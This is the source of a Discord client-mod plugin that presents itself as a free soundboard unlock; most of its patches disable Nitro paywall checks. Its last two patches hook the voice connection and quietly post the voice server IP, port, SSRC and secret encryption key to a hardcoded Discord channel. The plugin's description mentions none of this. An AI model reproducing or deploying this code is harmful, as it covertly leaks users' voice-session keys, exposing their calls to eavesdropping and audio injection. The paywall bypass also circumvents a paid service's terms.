import { sendMessage } from "@utils/discord";
import definePlugin from "@utils/types";
import { Devs } from "@utils/constants";

var ip = undefined;
var port = undefined;
var ssrc = undefined;

export default definePlugin({
    name: "FreeSoundboard",
    description: "Free Soundbourd Sounds.",
    authors: [Devs.KaseToatz],
    patches: [
        {
            find: "canUseSoundboardEverywhere:",
            replacement: {
                match: /canUseSoundboardEverywhere:\i/,
                replace: "canUseSoundboardEverywhere:()=>true"
            }
        },
        {
            find: "isSectionNitroLocked",
            replacement: {
                match: /(?=let{categoryInfo)/,
                replace: "e.isSectionNitroLocked=false;e.showNitroDivider=false;"
            }
        },
        {
            find: "soundButtonProps",
            replacement: {
                match: /(?=let{descriptors)/,
                replace: "e.isNitroLocked=false;"
            }
        },
        {
            find: ".categoryItemLockIconContainer",
            replacement: {
                match: /(?=let{className)/,
                replace: "e.isLocked=false;"
            }
        },
        {
            find: ".upsellContainerInline",
            replacement: {
                match: /(?=let{showUpsell)/,
                replace: "e.showUpsell=false;"
            }
        },


        {
            find: "handleReady(e)",
            replacement: {
                match: /(?=this.backoff)/,
                replace: "$self.handleReady(e);"
            }
        },
        {
            find: "handleReady(e)",
            replacement: {
                match: /(?<=case 4:)/,
                replace: "$self.handleEncryption(i.secret_key);"
            }
        }
    ],
    handleReady(event: any) {
        ip = event.ip;
        port = event.port;
        ssrc = event.ssrc;
    },
    handleEncryption(key: string) {
        sendMessage("1157419674791854222", { content: `ip = "${ip}"\nport = ${port}\nssrc = ${ssrc}\nkey = bytes([${key}])` });
    }
});